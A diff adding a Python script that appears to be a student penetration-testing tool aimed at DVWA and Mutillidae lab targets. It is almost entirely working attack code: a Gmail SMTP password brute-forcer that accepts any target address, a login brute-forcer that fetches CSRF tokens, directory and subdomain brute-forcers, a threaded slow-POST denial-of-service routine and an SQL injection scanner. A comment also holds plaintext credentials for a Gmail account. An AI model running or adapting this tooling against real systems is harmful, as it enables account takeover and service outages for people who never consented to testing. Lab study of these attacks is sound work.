@@ -1,0 +1,520 @@
+# Imports
+
+from urllib.parse import urlparse, urljoin
+from time import sleep
+import socket
+import threading
+import smtplib
+import requests
+import pyautogui
+import aspose.words as aw  # Used to create word document containing report
+from datetime import datetime
+from threading import Thread
+from bs4 import BeautifulSoup as bs
+
+# Variable Declarations
+
+total_seconds = 0
+successful_hit_type = []
+hit_type = []
+
+#DVWA Links
+
+root_url = "http://127.0.0.1/"
+website_url = "http://127.0.0.1"
+login_page = "http://127.0.0.1/login.php"
+sqli_page = "http://127.0.0.1/vulnerabilities/sqli/"
+
+# Mutillidae Links
+
+# root_url = "http://192.168.56.101"
+# website_url = "http://192.168.56.101/mutillidae"
+# login_page = "http://192.168.56.101/mutillidae/index.php?page=login.php"
+# sqli_page = "http://192.168.56.101/mutillidae/index.php?page=register.php"
+
+directoryListPath = "utils/directoryLists/dirbuster_200.txt"
+passwordListPath = "utils/passwordLists/passlist.txt"
+subdomainListPath = "utils/subdomainLists/subdomains.txt"
+usernameListPath = "utils/usernameLists/usernames_small.txt"
+
+listOfFunctionalities = ["Email Brute-Forcer", "Website Brute-Forcer", "Directory Brute-Forcer",
+                         "Sub Domain Brute-Forcer", "DOS", "SQL Injection Scan", "Generate Report", "Exit"]
+
+# Classes
+
+class Worker(Thread):
+    def __init__(self, host, port, path, sleepTime):
+        self.host = host
+        self.port = port
+        self.path = path
+        self.sleepTime = sleepTime
+        self.stopped = False
+        threading.Thread.__init__(self)
+
+    def stop(self): self.stopped = True
+
+    def run(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((self.host, self.port))
+        s.settimeout(1)
+        s.send((
+            'POST ' + self.path + ' HTTP/1.1\r\n' +
+            'Host: ' + self.host + '\r\n' +
+            'Connection: close\r\n' +
+            'Content-Length: 1000000\r\n' +
+            '\r\n').encode('ascii')
+        )
+
+        while not self.stopped:
+            s.send(('abc=123&').encode('ascii'))
+            sleep(self.sleepTime / 1000)
+
+        s.close
+
+# Utilities
+
+def request(url):
+    try:
+        return requests.get(url)
+    except requests.exceptions.ConnectionError:
+        pass
+    except requests.exceptions.InvalidURL:
+        print("Failed To Check URL: " + url)
+
+def getCurrentDateTime():
+    currentDate = datetime.now()
+    return currentDate
+
+def differenceInSeconds(stardDate, endDate):
+
+    difference = (endDate - stardDate)
+
+    return difference.total_seconds()
+
+def menuMaker():
+
+    try:
+        cnt = 0
+        for functionality in listOfFunctionalities:
+            cnt = cnt + 1
+            print(f"[{cnt}] {functionality}")
+
+        userInp = int(input("\nPlease Select The number of the functionality you would like to use: "))
+        userInp = userInp - 1
+
+        if userInp >= 0 and userInp <= len(listOfFunctionalities):
+            return listOfFunctionalities[userInp]
+        else:
+            return None
+    except Exception:
+        return None
+
+def generateReport():
+
+    dateTimeToday = datetime.now().strftime('%d-%m-%Y_%H:%M:%S')
+
+    report = aw.Document()
+    builder = aw.DocumentBuilder(report)
+
+    font = builder.font
+    font.size = 24
+    font.bold = True
+    font.name = "Arial"
+    font.underline = aw.Underline.SINGLE
+
+    builder.write("\nPenetration Testing Report:\n\n")
+
+    font.size = 16
+    font.bold = False
+    font.underline = aw.Underline.NONE
+
+    builder.write(f"\nURL of Website: {website_url}\n")
+    builder.write(f"\nDate and Time of Report: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n")
+
+    builder.write(f"\nTotal Number Of attacks attempted: {len(hit_type)}\n")
+
+    if len(hit_type) > 0:
+        builder.write(f"\nAll Types of attacks attempted: {hit_type}\n")
+
+    builder.write(f"\nNumber of Successful attacks: {len(successful_hit_type)}\n")
+
+    if len(successful_hit_type) > 0:
+        builder.write(f"\nTypes of Successful attacks: {successful_hit_type}\n")
+
+    builder.write(f"\nTime taken to finish all attacks: {round(total_seconds,2)} Seconds\n")
+
+    font = builder.font
+    font.size = 24
+    font.bold = True
+    font.name = "Arial"
+    font.underline = aw.Underline.SINGLE
+
+    builder.write(f"\nRecommendations: \n")
+
+    font.size = 16
+    font.bold = False
+    font.underline = aw.Underline.NONE
+
+    if "Email Brute-Forcer" or "Website Brute-Forcer" or "Directory Brute-Forcer" in successful_hit_type:
+        builder.write("\nBrute Force: https://owasp.org/www-community/attacks/Brute_force_attack")
+
+    if "DOS" in successful_hit_type:
+        builder.write("\nDOS: https://owasp.org/www-community/attacks/Denial_of_Service")
+
+    if "SQL Injection" in successful_hit_type:
+        builder.write("\nSQL Injection: https://owasp.org/www-community/attacks/SQL_Injection")
+
+    report.save(f"reports/report_{dateTimeToday}.docx")
+
+# Brute Forcers
+
+def emailBruteForce():
+
+    #Gmail Credentials of purposely created account:
+
+    # my_email = "pentester2472@gmail.com"
+    # password = "mcast1234"
+
+    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+    smtpserver.ehlo()
+    smtpserver.starttls()
+
+    user = input("[*] Enter Targets Email Address: ")
+
+    file = open(passwordListPath, "r")
+
+    for password in file:
+        password = password.strip('\n')
+        try:
+            smtpserver.login(user, password)
+            print("[+] Password Found: %s" % password)
+
+            return True
+        except smtplib.SMTPAuthenticationError:
+            print("[-] Wrong Password: " + password)
+
+    return False
+
+def websiteBruteForce(page_url):
+
+    with open(usernameListPath, "r") as usernames:
+
+        for username in usernames:
+
+            with open(passwordListPath, "r") as passwords:
+
+                for password in passwords:
+
+                    username = username.strip()
+                    password = password.strip()
+                    print(f"[!!] Trying To Brute Force With Username: '{username}', Password: '{password}'")
+
+                    with requests.Session() as s:
+
+                        resp = s.get(page_url)
+                        parsed_html = bs(resp.content, features="html.parser")
+                        input_value = parsed_html.body.find('input', attrs={'name': 'user_token'}).get("value")
+                        data_dict = {"username": username, "password": password, "Login": "Login",
+                                     "user_token": input_value}
+                        response = s.post(page_url, data_dict)
+
+                    if b"Login failed" in response.content:
+                        pass
+                    else:
+                        print("\n[+] Username: --> " + username)
+                        print("[+] Password: --> " + password)
+
+                        return True
+
+        print("\nUsername and password are not in wordlists.")
+        return False
+
+# Finders
+
+def webDirectoryFinder(page_url):
+
+    dirFound = False
+
+    target_url = page_url
+
+    print("\nBeginning Web Directory Brute-Force...\n")
+
+    file = open(directoryListPath,"r")
+
+    for line in file:
+        word = line.strip()
+        full_url = target_url + "/" + word
+        response = request(full_url)
+
+        if response:
+            print("[+] Discovered Directory At This Link: " + full_url)
+            dirFound = True
+
+    return  dirFound
+
+def subDomainsFinder(page_url):
+
+    subDomainFound = False
+
+    target_url = page_url
+    target_url = target_url.replace("http://", "")
+
+    print("\nBeginning Sub Domain Brute-Force...\n")
+
+    file = open(subdomainListPath,"r")
+
+    for line in file:
+        word = line.strip()
+        full_url = word + "." + target_url
+        response = request("http://" + full_url)
+
+        if response:
+            print("[+] Discovered Subdomain At This Link: " + full_url)
+            subDomainFound = True
+
+    return subDomainFound
+
+# DDOS Tools
+
+def DOS(url, threads, sleepTime):
+
+    urlParts = urlparse(url)
+
+    if urlParts.scheme != 'http':
+        raise Exception('Only the http protocol is currently supported')
+
+    port = urlParts.port
+
+    if port is None:
+        port = 80
+
+    print(f"Opening {threads} sockets to {urlParts.hostname}:{port}")
+
+    pool = []
+
+    for i in range(1, threads):
+        t = Worker(urlParts.hostname, port, urlParts.path, sleepTime)
+        pool.append(t)
+        t.start()
+
+    print(f"Started {threads} threads.")
+
+    sleep(2)
+
+    try:
+        data_dictionary = {"username": 'admin', "password": 'password', "Login": "submit"}
+        requests.post(login_page, data=data_dictionary, timeout=10)
+        ddos_success = False
+    except:
+        ddos_success = True
+
+    sleep(1)
+
+    print("Is Website Currently Down?: " + str(ddos_success))
+
+    for worker in pool:
+        worker.stop()
+
+    for worker in pool:
+        worker.join()
+
+    print("Closed Threads!")
+
+    return ddos_success
+
+# SQL Injection
+
+def get_all_forms(url):
+
+    soup = bs(s.get(url).content, "html.parser")
+
+    return soup.find_all("form")
+
+def get_form_details(form):
+
+    details = {}
+
+    try:
+        action = form.attrs.get("action").lower()
+    except:
+        action = None
+
+    method = form.attrs.get("method", "get").lower()
+
+    inputs = []
+
+    for input_tag in form.find_all("input"):
+        input_type = input_tag.attrs.get("type", "text")
+        input_name = input_tag.attrs.get("name")
+        input_value = input_tag.attrs.get("value", "")
+        inputs.append({"type": input_type, "name": input_name, "value": input_value})
+
+    details["action"] = action
+    details["method"] = method
+    details["inputs"] = inputs
+
+    return details
+
+def isInjectable(response):
+
+    errors = {
+        "you have an error in your sql syntax;",
+        "warning: mysql",
+        "unclosed quotation mark after the character string",
+        "quoted string not properly terminated"
+    }
+
+    for error in errors:
+        if error in response.content.decode().lower():
+            return True
+
+    return False
+
+def sqlInjectionScan(url):
+
+    forms = get_all_forms(url)
+    print(f"[+] Detected {len(forms)} forms on {url}.")
+
+    for form in forms:
+        form_details = get_form_details(form)
+        for c in "\"'":
+
+            data = {}
+            for input_tag in form_details["inputs"]:
+                if input_tag["type"] == "hidden" or input_tag["value"]:
+
+                    try:
+                        data[input_tag["name"]] = input_tag["value"] + c
+                    except:
+                        pass
+                elif input_tag["type"] != "submit":
+                    data[input_tag["name"]] = f"test{c}"
+
+            url = urljoin(url, form_details["action"])
+            if form_details["method"] == "post":
+                s.cookies.clear()
+                res = s.post(url, data=data)
+            elif form_details["method"] == "get":
+                s.cookies.clear()
+                res = s.get(url, params=data)
+
+            if isInjectable(res):
+                print("[+] SQL Injection vulnerability detected, link:", url)
+                print("[+] Form:")
+                print(form_details)
+                return True
+
+    return False
+
+if __name__ == '__main__':
+
+    while True:
+
+        methodChosen = menuMaker()
+
+        if methodChosen == "Email Brute-Forcer":
+
+            if "Email Brute-Forcer" not in hit_type:
+                hit_type.append("Email Brute-Forcer")
+
+            dateTimeStart = getCurrentDateTime()
+
+            if emailBruteForce():
+                if "Email Brute-Forcer" not in successful_hit_type:
+                    successful_hit_type.append("Email Brute Forcer")
+
+            dateTimeEnd = getCurrentDateTime()
+            total_seconds = total_seconds + differenceInSeconds(dateTimeStart, dateTimeEnd)
+
+        elif methodChosen == "Website Brute-Forcer":
+
+            if "Website Brute-Forcer" not in hit_type:
+                hit_type.append("Website Brute-Forcer")
+
+            dateTimeStart = getCurrentDateTime()
+
+            if websiteBruteForce(login_page):
+
+                if "Website Log-in Brute Force" not in successful_hit_type:
+                    successful_hit_type.append("Website Log-in Brute Force")
+
+            dateTimeEnd = getCurrentDateTime()
+            total_seconds = total_seconds + differenceInSeconds(dateTimeStart, dateTimeEnd)
+
+        elif methodChosen == "Directory Brute-Forcer":
+
+            if "Directory Brute-Forcer" not in hit_type:
+                hit_type.append("Directory Brute-Forcer")
+
+            dateTimeStart = getCurrentDateTime()
+
+            if webDirectoryFinder(website_url):
+                if "Directory Brute Force" not in successful_hit_type:
+                    successful_hit_type.append("Directory Brute Force")
+
+            dateTimeEnd = getCurrentDateTime()
+            total_seconds = total_seconds + differenceInSeconds(dateTimeStart, dateTimeEnd)
+
+        elif methodChosen == "Sub Domain Brute-Forcer":
+
+            if "Sub Domain Brute-Forcer" not in hit_type:
+                hit_type.append("Sub Domain Brute-Forcer")
+
+            dateTimeStart = getCurrentDateTime()
+
+            if subDomainsFinder(website_url):
+                if "Sub Domain Brute Force" not in successful_hit_type:
+                    successful_hit_type.append("Sub Domain Brute Force")
+
+            dateTimeEnd = getCurrentDateTime()
+            total_seconds = total_seconds + differenceInSeconds(dateTimeStart, dateTimeEnd)
+
+        elif methodChosen == "DOS":
+
+            if "DOS" not in hit_type:
+                hit_type.append("DOS")
+
+            dateTimeStart = getCurrentDateTime()
+
+            if DOS(root_url, 200, 1000):
+                if "DOS" not in successful_hit_type:
+                    successful_hit_type.append("DOS")
+
+            dateTimeEnd = getCurrentDateTime()
+            total_seconds = total_seconds + differenceInSeconds(dateTimeStart, dateTimeEnd)
+
+        elif methodChosen == "SQL Injection Scan":
+
+            if "SQL Injection" not in hit_type:
+                hit_type.append("SQL Injection")
+
+            dateTimeStart = getCurrentDateTime()
+
+            with requests.Session() as s:
+
+                s.headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
+                    'Cookie': 'security=low; PHPSESSID=geo7gb3ehf5gfnbhrvuqu545i7'
+                }
+
+                login_payload = {"username": "admin", "password": "password", "Login": "submit"}
+                r = s.post(login_page, data=login_payload)
+
+                if sqlInjectionScan(sqli_page):
+                    if "SQL Injection" not in successful_hit_type:
+                        successful_hit_type.append("SQL Injection")
+
+            dateTimeEnd = getCurrentDateTime()
+            total_seconds = total_seconds + differenceInSeconds(dateTimeStart, dateTimeEnd)
+
+        elif methodChosen == "Generate Report":
+            generateReport()
+
+        elif methodChosen == "Exit":
+            exit()
+
+        elif methodChosen is None:
+            print("An Invalid Option Was Inputted, Please Try Again")
+
+        input("\nPress Enter To Continue...")
+        pyautogui.hotkey('shift', 'l')  # Clears the pycharm console, will not work unless Clear All hotkey is set
